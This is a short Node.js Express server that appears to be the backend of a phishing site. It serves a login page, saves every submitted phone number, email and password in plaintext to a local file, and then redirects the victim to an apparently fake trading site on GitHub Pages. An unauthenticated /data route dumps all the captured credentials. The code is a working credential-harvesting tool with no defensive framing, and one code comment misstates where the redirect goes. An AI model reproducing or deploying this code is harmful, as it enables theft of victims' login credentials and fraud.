
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const port = 3000;

// Middleware to parse JSON and URL-encoded bodies
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// File for storing data
const DATA_FILE = './loginData.txt';

// Serve HTML file
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/login.html');
});

// Handle POST request for login
app.post('/login', (req, res) => {
    const { phone_number, email, password } = req.body;
    const loginData = `Phone number: ${phone_number}\nemail: ${email}\nPassword: ${password}\n`;

    // Append login data to file
    fs.appendFile(DATA_FILE, loginData, (err) => {
        if (err) {
            console.error('Error saving login data:', err);
            res.status(500).send('Error saving login data.');
        } else {
            console.log('Login data saved:\n', loginData.trim());
            // Redirect to Google.com after submitting the form
            res.redirect('https://jasteeeeee.github.io/Fox-bit-KingStone-Traders.github.io/');
        }
    });
});

// Route to retrieve all stored login data
app.get('/data', (req, res) => {
    fs.readFile(DATA_FILE, 'utf8', (err, data) => {
        if (err) {
            console.error('Error reading data:', err);
            res.status(500).send('Error reading data.');
        } else {
            res.type('text/plain');
            res.send(data);
        }
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
